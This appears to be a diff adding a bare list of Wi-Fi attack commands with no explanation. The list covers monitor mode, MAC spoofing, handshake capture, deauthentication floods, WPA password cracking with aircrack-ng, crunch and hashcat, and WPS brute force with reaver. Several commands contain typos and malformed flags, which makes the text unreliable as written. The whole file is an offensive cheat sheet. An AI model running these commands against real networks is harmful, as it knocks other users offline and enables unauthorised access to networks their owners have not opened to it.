@@ -1,0 +1,28 @@
+
+iwconfig wlan0 txpower 30
+airmon-ng start wlan0
+airmon-ng check kill
+airodump-ng wlan0mon
+aireplay-ng -9 wlan0mon
+airmon-ng
+ifconfig
+airmon-ng start wlan0
+airodump-ng wlan0mon
+airodump-ng -c 6 wlan0mon
+ifconfig wlan0 down
+ifconfig wlan0 | grep HW
+ifconfig wlan0 hw ether 38:33:15:xx:xx:xx
+ifconfig wlan0 up  
+macchanger wlan0 -e  
+macchanger wlan0 -r 
+airodump-ng -wlan0
+airodump-ng --bssid<MAC Address> -c 1 --showack-write /root/Desktop/Wifi/nameofthewifi
+aireplay-ng -deauth 11 -a <MAC Address> wlan0mon
+aircrack-ng-w passwordlist -b BSSID /root/Desktop/Wifi/nameofthewifi.cap  
+crunch 05 25abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWX YZ0123456789 | aircrack-ng --bssid (MAC address)  -w /root/Desktop/wifi/nameofthewifi.cap
+aircrack-ng /root/Desktop/wifi/nameofthewifi.cap -J <output file> 
+cuda Hashcat-plus32.bin -m 2500 <filename>.hccap <wordlist>  
+# john --stdout --incremental:all | pyrit -e WIFIESSID -i 1 -o - passthrough | cowpatty -r yourhandshake.cap -d - -s WIFIESSID  
+wash -i wlan0 --ignore-fcs
+reaver -i wlan0 -b (BBSID) -vv  
+aireplay-ng -0 0 -a (bssid) -c wlan0
